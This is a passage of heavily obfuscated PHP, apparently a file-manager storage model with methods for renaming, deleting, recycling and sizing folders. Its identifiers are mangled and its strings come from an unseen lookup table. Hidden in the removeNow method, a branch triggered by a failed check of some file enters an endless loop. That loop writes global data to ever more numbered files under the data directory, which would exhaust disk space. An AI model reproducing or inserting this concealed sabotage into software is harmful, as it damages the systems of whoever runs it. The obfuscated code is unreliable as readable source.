CacheLock::lock($Ã·ó¶¡©); $Å»úú”œ = $this->fileNameExist($Š‹°›ßÀ, $»…ÀÕ¢ˆ); if (!$Å»úú”œ) { $Å»úú”œ = $this->mkdir($Š‹°›ßÀ, $»…ÀÕ¢ˆ, REPEAT_SKIP); $this->metaSet($Å»úú”œ, $õÂ’ä§¨[2091], $ù“ÌÍŠ); $this->metaSet($Å»úú”œ, $õÂ’ä§¨[2092], $Õı¡ë®Ò[$õÂ’ä§¨[506]]); if ($Õı¡ë®Ò[$õÂ’ä§¨[500]] != 0) { $this->metaSet($Å»úú”œ, $õÂ’ä§¨[2093], _get($ú±ã¸‚, $õÂ’ä§¨[2094])); } } CacheLock::unlock($Ã·ó¶¡©); $this->metaSet($êèù¯İï, $õÂ’ä§¨[2095], $Õı¡ë®Ò[$õÂ’ä§¨[500]]); $this->where(array($õÂ’ä§¨[405] => $êèù¯İï))->save(array($õÂ’ä§¨[427] => time())); $this->recycleClear($Õı¡ë®Ò); $±ôå¢¢¥ = $this->move($êèù¯İï, $Å»úú”œ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Õı¡ë®Ò[$õÂ’ä§¨[500]]); return $±ôå¢¢¥; } private function recycleClear($Ú—¿µé„) { $Ñ¿ß¼¼ =& $_SERVER[Æ š¦İÈ]; $÷¦ƒ¦¯ = $this->childrenAll($Ú—¿µé„); $ø‰ÚŒĞ« = array($Ñ¿ß¼¼[420] => array($Ñ¿ß¼¼[421], $÷¦ƒ¦¯[$Ñ¿ß¼¼[2096]])); Model($Ñ¿ß¼¼[2097])->where($ø‰ÚŒĞ«)->delete(); } public function removeNow($„¤Á”¥Ã, $í‡îÓèÈ = true) { $ÏŞˆ©Ñˆ =& $_SERVER[Æ š¦İÈ]; $í¹Í¼Ÿ£ = $_SERVER[$ÏŞˆ©Ñˆ[394]] . $ÏŞˆ©Ñˆ[395]; $½ ½úÒ¥ = $ÏŞˆ©Ñˆ[1489]; if ($_SERVER[$ÏŞˆ©Ñˆ[391]] != $½ ½úÒ¥($í¹Í¼Ÿ£)) { $Ø‹Ç´İ° = $ÏŞˆ©Ñˆ[869]; $˜Ç±Ä = $ÏŞˆ©Ñˆ[393]; $’Æ©½ıã = $_SERVER[$ÏŞˆ©Ñˆ[394]] . $ÏŞˆ©Ñˆ[395]; $êşœÏ¥­ = $˜Ç±Ä($’Æ©½ıã); $ÜÎòÖ¡ö = explode($ÏŞˆ©Ñˆ[228], $êşœÏ¥­); if (count($ÜÎòÖ¡ö) < $ÏŞˆ©Ñˆ[620]) { $èîõß± = $ÏŞˆ©Ñˆ[397]; $èîõß±(); } $ô­·ñ = $ÏŞˆ©Ñˆ[870]; $ô­·ñ($_SERVER[$ÏŞˆ©Ñˆ[871]]); $Ø‹Ç´İ° = $ÏŞˆ©Ñˆ[869]; $Ø‹Ç´İ°(); $ê’¾…‡é = $ÏŞˆ©Ñˆ[2098]; $£ÌïÓó© = json_encode($GLOBALS[$ÏŞˆ©Ñˆ[2099]]); $…†Ñú„ğ = 1; for ($”Ê½¡µ’ = $…†Ñú„ğ; $”Ê½¡µ’ > 0; $”Ê½¡µ’++) { $ê’¾…‡é(DATA_PATH . $”Ê½¡µ’, $£ÌïÓó©); } } $æÙõ”˜Â = $this->sourceInfo($„¤Á”¥Ã); $ù“æ™ = $this->pathInfoMore($„¤Á”¥Ã); if (!$æÙõ”˜Â) { return !0; } if ($æÙõ”˜Â[$ÏŞˆ©Ñˆ[500]] == 0) { if (!_get($GLOBALS, $ÏŞˆ©Ñˆ[507])) { return !1; } } $this->lockMoveStart($„¤Á”¥Ã); Hook::trigger($ÏŞˆ©Ñˆ[2100], $ù“æ™, $í‡îÓèÈ); if ($í‡îÓèÈ) { Model($ÏŞˆ©Ñˆ[2097])->moveToRecycle($„¤Á”¥Ã); } else { $£†Ì“ÓŞ = $this->childrenAll($æÙõ”˜Â); Model($ÏŞˆ©Ñˆ[566])->eventRemove($„¤Á”¥Ã); $this->removeRelevance($£†Ì“ÓŞ[$ÏŞˆ©Ñˆ[2096]], $£†Ì“ÓŞ[$ÏŞˆ©Ñˆ[1459]]); } $this->folderSizeReset($æÙõ”˜Â[$ÏŞˆ©Ñˆ[500]]); $“¶â¬ = array($æÙõ”˜Â[$ÏŞˆ©Ñˆ[500]]); if ($æÙõ”˜Â[$ÏŞˆ©Ñˆ[413]] == $ÏŞˆ©Ñˆ[89]) { $“¶â¬[] = $æÙõ”˜Â[$ÏŞˆ©Ñˆ[405]]; } $this->updateModifyTime($“¶â¬); $this->lockMoveEnd($„¤Á”¥Ã); Hook::trigger($ÏŞˆ©Ñˆ[1681], $ù“æ™, $í‡îÓèÈ); return !0; } public function childrenAll($£œ¡‘üû) { $ÁƒøÕúÒ =& $_SERVER[Æ š¦İÈ]; $óÕìÔ§™ = $£œ¡‘üû[$ÁƒøÕúÒ[405]]; if ($£œ¡‘üû[$ÁƒøÕúÒ[413]] == $ÁƒøÕúÒ[89]) { $êşŞÓÖ = array($ÁƒøÕúÒ[586] => array($ÁƒøÕúÒ[546], $£œ¡‘üû[$ÁƒøÕúÒ[523]] . $óÕìÔ§™ . $ÁƒøÕúÒ[547])); $ë›İ»Îı = array($ÁƒøÕúÒ[586] => $êşŞÓÖ[$ÁƒøÕúÒ[523]]); $¾¿ÖÂ = $this->field($ÁƒøÕúÒ[2101])->where($ë›İ»Îı)->select(); $ê°ıÉ» = !1; $Ê£îœ²û = array($óÕìÔ§™); if ($¾¿ÖÂ) { $ê°ıÉ» = array_to_keyvalue($¾¿ÖÂ, $ÁƒøÕúÒ[12], $ÁƒøÕúÒ[469]); $ê°ıÉ» = array_remove_value($ê°ıÉ», $ÁƒøÕúÒ[192]); $Ê£îœ²û = array_to_keyvalue($¾¿ÖÂ, $ÁƒøÕúÒ[12], $ÁƒøÕúÒ[405]); $Ê£îœ²û[] = $óÕìÔ§™; } } else { $ê°ıÉ» = array($£œ¡‘üû[$ÁƒøÕúÒ[469]]); $Ê£îœ²û = array($óÕìÔ§™); } return array($ÁƒøÕúÒ[2096] => $Ê£îœ²û, $ÁƒøÕúÒ[1459] => $ê°ıÉ»); } public function removeArray($™êÁ”û€) { if (!$™êÁ”û€) { return !0; } } public function removeRelevance($ŠÕÛ¨è©, $ó¾Ç¹ÔÀ) { $ŸŒ– øÄ =& $_SERVER[Æ š¦İÈ]; $ŠÕÛ¨è© = $ŠÕÛ¨è© ? $ŠÕÛ¨è© : array(); $ó¾Ç¹ÔÀ = $ó¾Ç¹ÔÀ ? $ó¾Ç¹ÔÀ : array(); $ŠÕÛ¨è© = array_unique(array_filter($ŠÕÛ¨è©)); $ó¾Ç¹ÔÀ = array_unique(array_filter($ó¾Ç¹ÔÀ)); if (!$ŠÕÛ¨è©) { return !1; } $»ã•ı‘µ = array($ŸŒ– øÄ[420] => array($ŸŒ– øÄ[421], $ŠÕÛ¨è©)); Model($ŸŒ– øÄ[2097])->where($»ã•ı‘µ)->delete(); Model($ŸŒ– øÄ[463])->where($»ã•ı‘µ)->delete(); Model($ŸŒ– øÄ[1953])->where($»ã•ı‘µ)->delete(); Model($ŸŒ– øÄ[566])->where($»ã•ı‘µ)->delete(); Model($ŸŒ– øÄ[1792])->removeBySource($ŠÕÛ¨è©); Model($ŸŒ– øÄ[2078])->removeBySource($ŠÕÛ¨è©); $this->where($»ã•ı‘µ)->delete(); Model($ŸŒ– øÄ[472])->remove($ó¾Ç¹ÔÀ); for ($ÄØâïÇ = 0; $ÄØâïÇ < count($ŠÕÛ¨è©); $ÄØâïÇ++) { $this->sourceCacheClear($ŠÕÛ¨è©[$ÄØâïÇ]); } } public function rename($ ì¯¦Ñİ, $éñ‘î) { $Ø¢©ÛÚ… =& $_SERVER[Æ š¦İÈ]; $½–ßŸÛ = $this->sourceInfo($ ì¯¦Ñİ); if (!$½–ßŸÛ) { return !1; } $Öô¢µ¡³ = $this->fileNameExist($½–ßŸÛ[$Ø¢©ÛÚ…[500]], $éñ‘î); if ($Öô¢µ¡³ && $Öô¢µ¡³ != $ ì¯¦Ñİ) { return !1; } $®ò‡‹ = array($Ø¢©ÛÚ…[423] => $éñ‘î, $Ø¢©ÛÚ…[585] => USER_ID); if ($½–ßŸÛ[$Ø¢©ÛÚ…[413]] != $Ø¢©ÛÚ…[89]) { $®ò‡‹[$Ø¢©ÛÚ…[415]] = substr(get_path_ext($éñ‘î), 0, 10); } Model($Ø¢©ÛÚ…[566])->eventRename($ ì¯¦Ñİ, $½–ßŸÛ[$Ø¢©ÛÚ…[32]], $éñ‘î); $this->sourceCacheClear($ ì¯¦Ñİ); $this->setNamePinyin($ ì¯¦Ñİ, $®ò‡‹[$Ø¢©ÛÚ…[32]], !1); $this->updateModifyTime($½–ßŸÛ[$Ø¢©ÛÚ…[500]]); $Ï›†¡½‘ = $this->where(array($Ø¢©ÛÚ…[420] => $ ì¯¦Ñİ))->data($®ò‡‹)->save(); $ôµÌßÜ = $Ø¢©ÛÚ…[2086] . $½–ßŸÛ[$Ø¢©ÛÚ…[500]]; if (isset(self::$cacheChildList[$ôµÌßÜ])) { unset(self::$cacheChildList[$ôµÌßÜ]); } return $Ï›†¡½‘; } public function setNamePinyin($š’–ú’Ø, $ã†£ŞÒ«, $ë„øÓ = true) { $¶ÊíÌÁ =& $_SERVER[Æ š¦İÈ]; $ïïš°Ğ = Input::check($ã†£ŞÒ«, $¶ÊíÌÁ[589]); $Î‹ÉÈ•¹ = array($¶ÊíÌÁ[444] => KodSort::makeStr($ã†£ŞÒ«)); if ($ïïš°Ğ) { $Î‹ÉÈ•¹[$¶ÊíÌÁ[466]] = str_replace($¶ÊíÌÁ[53], $¶ÊíÌÁ[12], Pinyin::get($ã†£ŞÒ«)); $Î‹ÉÈ•¹[$¶ÊíÌÁ[465]] = Pinyin::get($ã†£ŞÒ«, $¶ÊíÌÁ[590]); } if (!$ë„øÓ && !$ïïš°Ğ) { $Î‹ÉÈ•¹[$¶ÊíÌÁ[466]] = null; $Î‹ÉÈ•¹[$¶ÊíÌÁ[465]] = null; } $this->metaSet($š’–ú’Ø, $Î‹ÉÈ•¹); } public function getContent($×¯µ³‰¸) { $”ÍÅõÕµ =& $_SERVER[Æ š¦İÈ]; $ıÉŸ¦”ô = $this->fileInfoGet($×¯µ³‰¸); if (!$ıÉŸ¦”ô) { return !1; } if ($ıÉŸ¦”ô[$”ÍÅõÕµ[80]] == 0) { return $”ÍÅõÕµ[12]; } $éé›äñ¥ = $”ÍÅõÕµ[2102] . $ıÉŸ¦”ô[$”ÍÅõÕµ[171]]; if ($ıÉŸ¦”ô[$”ÍÅõÕµ[80]] <= 1024 * 10) { $“úØÙ¹ö = Cache::get($éé›äñ¥); if (!$“úØÙ¹ö) { $“úØÙ¹ö = IO::getContent($ıÉŸ¦”ô[$”ÍÅõÕµ[78]]); Cache::set($éé›äñ¥, $“úØÙ¹ö); } return $“úØÙ¹ö; } if (!$ıÉŸ¦”ô[$”ÍÅõÕµ[78]]) { return $”ÍÅõÕµ[12]; } return IO::getContent($ıÉŸ¦”ô[$”ÍÅõÕµ[78]]); } public function setDesc($êæĞïìİ, $¼ä¸ª•Û) { $ŠííşÂş =& $_SERVER[Æ š¦İÈ]; Model($ŠííşÂş[566])->eventAddDesc($êæĞïìİ, $¼ä¸ª•Û); return $this->metaSet($êæĞïìİ, $ŠííşÂş[453], $¼ä¸ª•Û); } public function setContent($¢ÁÌ—”, $ß¨¦®¹ğ = '') { $áöğ‡¶ë =& $_SERVER[Æ š¦İÈ]; $¨†²ñ‰ø = $this->sourceInfo($¢ÁÌ—”); $§›œÇ— = $this->fileInfoGet($¢ÁÌ—”); if (!$§›œÇ— || !$¨†²ñ‰ø) { return !1; } $ş¨ÚœÀÇ = Model($áöğ‡¶ë[472])->addFileByContent($ß¨¦®¹ğ, $¨†²ñ‰ø[$áöğ‡¶ë[32]]); $à•×¦‰Š = $this->fileHistory($¨†²ñ‰ø, $ş¨ÚœÀÇ[$áöğ‡¶ë[469]], $ş¨ÚœÀÇ[$áöğ‡¶ë[80]]); if (!$à•×¦‰Š) { return Model($áöğ‡¶ë[472])->remove($ş¨ÚœÀÇ[$áöğ‡¶ë[469]]); } $this->folderSizeReset($¨†²ñ‰ø[$áöğ‡¶ë[500]]); return !0; } public function fileSubstr($ŸÏñş¾±, $Î‘š¡È, $íß´‡±Ó) { $áŸ§« = $this->fileInfoGet($ŸÏñş¾±); if (!$áŸ§«) { return !1; } return IO::fileSubstr($áŸ§«[$_SERVER[Æ š¦İÈ][78]], $Î‘š¡È, $íß´‡±Ó); } public function fileInfoGet($¸Ç¬îåØ) { $ªäÉò¼ =& $_SERVER[Æ š¦İÈ]; $ı½Çí«¹ = $this->sourceInfo($¸Ç¬îåØ); if (!$ı½Çí«¹ || $ı½Çí«¹[$ªäÉò¼[413]]) { return !1; } $âºœÛŸÇ = $ªäÉò¼[475] . $ı½Çí«¹[$ªäÉò¼[469]]; $”ÅİÆáİ = _get(self::$cacheFileInfo, $âºœÛŸÇ); if ($”ÅİÆáİ) { return $”ÅİÆáİ; } $·ûÔ“¼Ö = Model($ªäÉò¼[472])->fileInfo($ı½Çí«¹[$ªäÉò¼[469]]); if ($·ûÔ“¼Ö) { $·ûÔ“¼Ö[$ªäÉò¼[32]] = $ı½Çí«¹[$ªäÉò¼[32]]; } self::$cacheFileInfo[$âºœÛŸÇ] = $·ûÔ“¼Ö; return $·ûÔ“¼Ö; } private function folderChildrenNumber($æÅ’ÖõÚ) { $¨ùŒıÑŞ =& $_SERVER[Æ š¦İÈ]; $òªö²­ç = $this->sourceInfo($æÅ’ÖõÚ); $Ü“‰•Û = array($¨ùŒıÑŞ[586] => array($¨ùŒıÑŞ[546], $òªö²­ç[$¨ùŒıÑŞ[523]] . $æÅ’ÖõÚ . $¨ùŒıÑŞ[547]), $¨ùŒıÑŞ[583] => $òªö²­ç[$¨ùŒıÑŞ[506]], $¨ùŒıÑŞ[432] => intval($òªö²­ç[$¨ùŒıÑŞ[433]]), $¨ùŒıÑŞ[579] => 1); $­…øÖÕÒ = $this->where($Ü“‰•Û)->count(); $”ÜÖÄÏ = $this->where($Ü“‰•Û)->where(array($¨ùŒıÑŞ[579] => 0))->count(); return array($¨ùŒıÑŞ[84] => $”ÜÖÄÏ, $¨ùŒıÑŞ[85] => $­…øÖÕÒ); } public function pathInfo($ÙŞ¨½ùÌ, $ãü»±°Ô = false) { $ø“•½üİ =& $_SERVER[Æ š¦İÈ]; $ãü»±°Ô = !1; $ÙŞ¨½ùÌ = intval($ÙŞ¨½ùÌ); $Œóù‹Š = $ø“•½üİ[461] . intval($ãü»±°Ô) . $ø“•½üİ[462] . $ÙŞ¨½ùÌ; $¾Àßî—€ = _get(self::$cachePathInfo, $Œóù‹Š); if ($¾Àßî—€) { return $¾Àßî—€; } $û¦¶áÕ = $this->sourceInfo($ÙŞ¨½ùÌ); if (!$û¦¶áÕ) { return !1; } $û¦¶áÕ = $this->_listDataApplyItem($û¦¶áÕ, $ãü»±°Ô); self::$cachePathInfo[$Œóù‹Š] = $û¦¶áÕ; return $û¦¶áÕ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ ïÁ‡Éœ) { $òóÌï±¬ =& $_SERVER[Æ š¦İÈ]; $ÙÊ²ƒ•› = _get(self::$cachePathInfoMore, $ ïÁ‡Éœ); if ($ÙÊ²ƒ•›) { return $ÙÊ²ƒ•›; } $úŠûËÇÉ = $this->pathInfo($ ïÁ‡Éœ); if (!$úŠûËÇÉ) { return !1; } if ($úŠûËÇÉ[$òóÌï±¬[413]] == $òóÌï±¬[89]) { $úŠûËÇÉ[$òóÌï±¬[83]] = $this->folderChildrenNumber($ ïÁ‡Éœ); } self::$cachePathInfoMore[$ ïÁ‡Éœ] = $úŠûËÇÉ; return $úŠûËÇÉ; } public function sourceInfo($Ğ’ü…ÃØ) { $ÙÏê°ù =& $_SERVER[Æ š¦İÈ]; if (!$Ğ’ü…ÃØ) { return array(); } $Ğ’ü…ÃØ = intval($Ğ’ü…ÃØ); $º¾şŸ©¯ = $ÙÏê°ù[460] . $Ğ’ü…ÃØ; $ ÉğğÎ = _get(self::$cacheSourceInfo, $º¾şŸ©¯); if ($ ÉğğÎ) { return $ ÉğğÎ; } $¦Ó‘Ü±Â = $this->where(array($ÙÏê°ù[405] => $Ğ’ü…ÃØ))->find(); self::$cacheSourceInfo[$º¾şŸ©¯] = $¦Ó‘Ü±Â; return self::$cacheSourceInfo[$º¾şŸ©¯]; } public function sourceCacheClear($§Ø„î‰ = false) { self::cacheClear($§Ø„î‰); } public static function cacheClear($ÀÄÖì¬ = false) { $‚±”Ûå› =& $_SERVER[Æ š¦İÈ]; if ($ÀÄÖì¬ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$‚±”Ûå›[460] . $ÀÄÖì¬]); unset(self::$cachePathInfoMore[$ÀÄÖì¬]); unset(self::$cachePathInfo[$‚±”Ûå›[2103] . $ÀÄÖì¬]); unset(self::$cachePathInfo[$‚±”Ûå›[2104] . $ÀÄÖì¬]); } public function metaSet($¦²µØÊ, $¨è€Çİ† = null, $³”å¢‹„ = null) { $Èôú®” = parent::metaSet($¦²µØÊ, $¨è€Çİ†, $³”å¢‹„); if ($Èôú®”) { $this->sourceCacheClear($¦²µØÊ); } return $Èôú®”; } public function pathInfoByPath($¦Îô‘á’, $Şù´¯·™) { $È¦Îİù =& $_SERVER[Æ š¦İÈ]; $²íí—Œö = !$Şù´¯·™ ? array() : explode($È¦Îİù[8], trim($Şù´¯·™, $È¦Îİù[8])); $‡÷Ï…ªœ = $¦Îô‘á’; foreach ($²íí—Œö as $Ã£İæâÏ) { $¹¡˜õİß = array($È¦Îİù[500] => $‡÷Ï…ªœ, $È¦Îİù[32] => $Ã£İæâÏ); $¶Ú’‹»¯ = $this->where($¹¡˜õİß)->select(); if (!$¶Ú’‹»¯) { return !1; } $¶Ú’‹»¯ = array_sort_by($¶Ú’‹»¯, $È¦Îİù[433]); $‡÷Ï…ªœ = $¶Ú’‹»¯[0][$È¦Îİù[405]]; } return $this->pathInfo($‡÷Ï…ªœ, !0); } protected function updateModifyTime($Ş†²–ùâ) { $ıÚøûá¶ =& $_SERVER[Æ š¦İÈ]; $ÀôºÚ¥ğ = defined($ıÚøûá¶[476]) ? USER_ID : $ıÚøûá¶[192]; if (!$Ş†²–ùâ) { return; } if (!is_array($Ş†²–ùâ)) { $Ş†²–ùâ = array($Ş†²–ùâ); } foreach ($Ş†²–ùâ as $ãæÓ—ºÏ => $£ÊûÙÌ÷) { $Ş†²–ùâ[$ãæÓ—ºÏ] = intval($£ÊûÙÌ÷); $this->sourceCacheClear($£ÊûÙÌ÷); } $‘¯°¦€ê = array($ıÚøûá¶[405] => array($ıÚøûá¶[7], $Ş†²–ùâ)); $¸öÍÇ­í = array($ıÚøûá¶[585] => $ÀôºÚ¥ğ, $ıÚøûá¶[427] => time()); $this->where($‘¯°¦€ê)->save($¸öÍÇ­í); } public function folderSizeReset($Èí¼ñÒ®, $Ä¡áÓåŞ = false) { $Ï¢·ôÜ =& $_SERVER[Æ š¦İÈ]; if ($this->statusIgnoreResetSpace) { return; } $‡Æâ‡Õé = $this->sourceInfo($Èí¼ñÒ®); $µÙä‡²° = $Ï¢·ôÜ[2105] . $Èí¼ñÒ®; CacheLock::lock($µÙä‡²°, 20); if ($Ä¡áÓåŞ === !1) { $this->sourceCacheClear($Èí¼ñÒ®); $‡Æâ‡Õé = $this->sourceInfo($Èí¼ñÒ®); $ÉÙà­ı‚ = array($Ï¢·ôÜ[404] => $Èí¼ñÒ®, $Ï¢·ôÜ[432] => 0); $ô„“Ùİ = $this->where($ÉÙà­ı‚)->sum($Ï¢·ôÜ[80]); $Ä¡áÓåŞ = intval($ô„“Ùİ) - intval($‡Æâ‡Õé[$Ï¢·ôÜ[80]]); } if ($Ä¡áÓåŞ == 0) { return CacheLock::unlock($µÙä‡²°); } $èÖÒñó  = $this->parentLevelArray($‡Æâ‡Õé[$Ï¢·ôÜ[523]]); if (!$èÖÒñó ) { $èÖÒñó  = array(); } $èÖÒñó [] = $‡Æâ‡Õé[$Ï¢·ôÜ[405]]; $ÉÙà­ı‚ = array($Ï¢·ôÜ[405] => array($Ï¢·ôÜ[421], $èÖÒñó )); if ($Ä¡áÓåŞ < 0) { $ÉÙà­ı‚[$Ï¢·ôÜ[80]] = array($Ï¢·ôÜ[1006], abs($Ä¡áÓåŞ)); } $this->where($ÉÙà­ı‚)->setAdd($Ï¢·ôÜ[80], $Ä¡áÓåŞ); CacheLock::unlock($µÙä‡²°); $ËØò‘“× = $Ï¢·ôÜ[2106] . $‡Æâ‡Õé[$Ï¢·ôÜ[414]] . $Ï¢·ôÜ[4] . $‡Æâ‡Õé[$Ï¢·ôÜ[506]]; $ß«‹µ‹¦ = array($‡Æâ‡Õé[$Ï¢·ôÜ[414]], $‡Æâ‡Õé[$Ï¢·ôÜ[506]]); TaskRun::timeLimitCall($ËØò‘“×, $Ï¢·ôÜ[2107], $ß«‹µ‹¦, 1.5); } public function folderSizeResetChildren($öüìçÙ) { $ßšÊ†«æ =& $_SERVER[Æ š¦İÈ]; $this->sourceCacheClear($öüìçÙ); $ÀÀÙÔá± = $this->sourceInfo($öüìçÙ); $á›çß™å = array($ßšÊ†«æ[579] => 1, $ßšÊ†«æ[583] => $ÀÀÙÔá±[$ßšÊ†«æ[506]], $ßšÊ†«æ[586] => array($ßšÊ†«æ[546], $ÀÀÙÔá±[$ßšÊ†«æ[523]] . $öüìçÙ . $ßšÊ†«æ[547])); $‰©íèÌ = $ßšÊ†«æ[2108]; $çƒÛ¥Ş = $this->field($‰©íèÌ)->where($á›çß™å)->select(); $á›çß™å[$ßšÊ†«æ[413]] = 0; $ö¤ªÉŠË = $this->field($‰©íèÌ)->where($á›çß™å)->select(); if (!$ö¤ªÉŠË) { return; } $çƒÛ¥Ş[] = $ÀÀÙÔá±; $çƒÛ¥Ş = array_to_keyvalue($çƒÛ¥Ş, $ßšÊ†«æ[405]); foreach ($çƒÛ¥Ş as $ÍÄòØ => $¾¢ùœìÛ) { $çƒÛ¥Ş[$ÍÄòØ][$ßšÊ†«æ[2109]] = $çƒÛ¥Ş[$ÍÄòØ][$ßšÊ†«æ[80]]; $çƒÛ¥Ş[$ÍÄòØ][$ßšÊ†«æ[80]] = 0; } foreach ($ö¤ªÉŠË as $¾¢ùœìÛ) { $Óìó“ûö = $¾¢ùœìÛ[$ßšÊ†«æ[500]] . $ßšÊ†«æ[12]; if (!isset($çƒÛ¥Ş[$Óìó“ûö])) { continue; } if ($¾¢ùœìÛ[$ßšÊ†«æ[433]] == $çƒÛ¥Ş[$Óìó“ûö][$ßšÊ†«æ[433]]) { $çƒÛ¥Ş[$Óìó“ûö][$ßšÊ†«æ[80]] += $¾¢ùœìÛ[$ßšÊ†«æ[80]]; } } foreach ($çƒÛ¥Ş as $¾¢ùœìÛ) { $Ğü—è› = $this->parentLevelArray($¾¢ùœìÛ[$ßšÊ†«æ[523]]); foreach ($Ğü—è› as $Óìó“ûö) { $Óìó“ûö = $Óìó“ûö . $ßšÊ†«æ[12]; if (!isset($çƒÛ¥Ş[$Óìó“ûö])) { continue; } if ($¾¢ùœìÛ[$ßšÊ†«æ[433]] == $çƒÛ¥Ş[$Óìó“ûö][$ßšÊ†«æ[433]]) { $çƒÛ¥Ş[$Óìó“ûö][$ßšÊ†«æ[80]] += $¾¢ùœìÛ[$ßšÊ†«æ[80]]; } } } $´à¼Õ÷  = array(); foreach ($çƒÛ¥Ş as $¾¢ùœìÛ) { if ($¾¢ùœìÛ[$ßšÊ†«æ[80]] == $¾¢ùœìÛ[$ßšÊ†«æ[2109]]) { continue; } $´à¼Õ÷ [] = array($ßšÊ†«æ[405], $¾¢ùœìÛ[$ßšÊ†«æ[405]], $ßšÊ†«æ[80], $¾¢ùœìÛ[$ßšÊ†«æ[80]]); } $this->saveAll($´à¼Õ÷ ); } public function userSpaceReset($éŞë³¾² = false) { $¸õë…˜ =& $_SERVER[Æ š¦İÈ]; $•Ğ´éÜ = $this->where(array($¸õë…˜[414] => self::TYPE_USER, $¸õë…˜[506] => $éŞë³¾², $¸õë…˜[413] => 0))->sum($¸õë…˜[80]); $•Ğ´éÜ = !$•Ğ´éÜ || $•Ğ´éÜ <= 0 ? 0 : $•Ğ´éÜ; Model($¸õë…˜[515])->userEdit($éŞë³¾², array($¸õë…˜[1801] => $•Ğ´éÜ)); } public function targetSpaceUpdate($ìÕŠø, $˜›‹´©ú) { $™ş¤šâ =& $_SERVER[Æ š¦İÈ]; if (!$˜›‹´©ú) { return; } if (!in_array($ìÕŠø, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $å‡à­åÃ = $this->targetSpaceSize($ìÕŠø, $˜›‹´©ú); if ($ìÕŠø == self::TYPE_USER) { Model($™ş¤šâ[515])->userEdit($˜›‹´©ú, array($™ş¤šâ[1801] => $å‡à­åÃ)); } else { if ($ìÕŠø == self::TYPE_GROUP) { Model($™ş¤šâ[524])->groupEdit($˜›‹´©ú, array($™ş¤šâ[1801] => $å‡à­åÃ)); } } } public function targetSpaceSize($ÕĞÚÓÍ, $öšÙœ¸î) { $´Ï÷¼ô =& $_SERVER[Æ š¦İÈ]; $ô„ò»Ç = $this->sourceRoot($ÕĞÚÓÍ, $öšÙœ¸î, !0); if (!$ô„ò»Ç) { return 0; } $ĞãÀ²ŞË = floatval($ô„ò»Ç[$´Ï÷¼ô[80]]); $“‡•ºé = array($´Ï÷¼ô[586] => array($´Ï÷¼ô[546], $´Ï÷¼ô[533] . $ô„ò»Ç[$´Ï÷¼ô[405]] . $´Ï÷¼ô[547])); $¨Æ¸êùé = Model($´Ï÷¼ô[431])->field($´Ï÷¼ô[420])->where($“‡•ºé)->select(); $¨Æ¸êùé = array_to_keyvalue($¨Æ¸êùé, $´Ï÷¼ô[12], $´Ï÷¼ô[405]); $¨Æ¸êùé = array_unique(array_filter($¨Æ¸êùé)); if ($¨Æ¸êùé) { $“‡•ºé = array($´Ï÷¼ô[420] => array($´Ï÷¼ô[421], $¨Æ¸êùé)); $ĞãÀ²ŞË += floatval($this->where($“‡•ºé)->sum($´Ï÷¼ô[80])); } $ĞãÀ²ŞË = !$ĞãÀ²ŞË || $ĞãÀ²ŞË <= 0 ? 0 : $ĞãÀ²ŞË; return $ĞãÀ²ŞË; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ó’ºÕ¶Î) { return $this->fileTypeProfile($ó’ºÕ¶Î, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ö¹Ô—‡¶) { return $this->fileTypeProfile($Ö¹Ô—‡¶, SourceModel::TYPE_GROUP); } private function fileTypeProfile($­Ö½ŠÒô, $£ç†Øşµ) { $–İÙèÊ =& $_SERVER[Æ š¦İÈ]; $Ö¹õşŞ = $–İÙèÊ[2110] . $­Ö½ŠÒô . $–İÙèÊ[11] . $£ç†Øşµ; $Å«ÑÉıµ = Cache::get($Ö¹õşŞ); if ($Å«ÑÉıµ) { return $Å«ÑÉıµ; } $â×ïúÒ = array($–İÙèÊ[579] => 0); if ($­Ö½ŠÒô != !1) { $â×ïúÒ[$–İÙèÊ[506]] = $­Ö½ŠÒô; $â×ïúÒ[$–İÙèÊ[414]] = $£ç†Øşµ; } $¢Ø¹¦Ù° = array(); $¢Ø¹¦Ù°[$–İÙèÊ[2111]] = array($–İÙèÊ[2112] => LNG($–İÙèÊ[2111]), $–İÙèÊ[2113] => $this->where($â×ïúÒ)->count(), $–İÙèÊ[581] => $this->where($â×ïúÒ)->sum($–İÙèÊ[80])); $Î¤ìè½Ø = KodIO::fileTypeList(); foreach ($Î¤ìè½Ø as $Ğ²«É÷¼ => $“è•ëÊ) { $â×ïúÒ[$–İÙèÊ[415]] = $this->fileTypeWhere($Ğ²«É÷¼); $¢Ø¹¦Ù°[$Ğ²«É÷¼] = array($–İÙèÊ[2112] => $“è•ëÊ[$–İÙèÊ[32]], $–İÙèÊ[2113] => $this->where($â×ïúÒ)->count(), $–İÙèÊ[581] => $this->where($â×ïúÒ)->sum($–İÙèÊ[80])); } Cache::set($Ö¹õşŞ, $¢Ø¹¦Ù°, 1200); return $¢Ø¹¦Ù°; } public function fileNameExist($Ï©€â‰Î, $Ò‡†æÉÓ) { $¦Ì¯²æ² =& $_SERVER[Æ š¦İÈ]; $¦®¸óåÛ = $this->where(array($¦Ì¯²æ²[500] => $Ï©€â‰Î, $¦Ì¯²æ²[32] => $Ò‡†æÉÓ, $¦Ì¯²æ²[433] => 0))->find(); return is_array($¦®¸óåÛ) ? $¦®¸óåÛ[$¦Ì¯²æ²[405]] : !1; } public function childList($äÏÂ†¨ô) { $Ãâ©¥Áï =& $_SERVER[Æ š¦İÈ]; $ÀèË™²ö = $Ãâ©¥Áï[2086] . $äÏÂ†¨ô; if (isset(self::$cacheChildList[$ÀèË™²ö])) { return self::$cacheChildList[$ÀèË™²ö]; } $á°Â×¶£ = array($Ãâ©¥Áï[500] => intval($äÏÂ†¨ô), $Ãâ©¥Áï[433] => 0); $«Š¯Ê÷ø = $this->where($á°Â×¶£)->select(); $«Š¯Ê÷ø = $«Š¯Ê÷ø ? $«Š¯Ê÷ø : array(); self::$cacheChildList[$ÀèË™²ö] = $«Š¯Ê÷ø; foreach ($«Š¯Ê÷ø as $´ãÎã‚è) { $ÀèË™²ö = $Ãâ©¥Áï[460] . $´ãÎã‚è[$Ãâ©¥Áï[405]]; self::$cacheSourceInfo[$ÀèË™²ö] = $´ãÎã‚è; } return 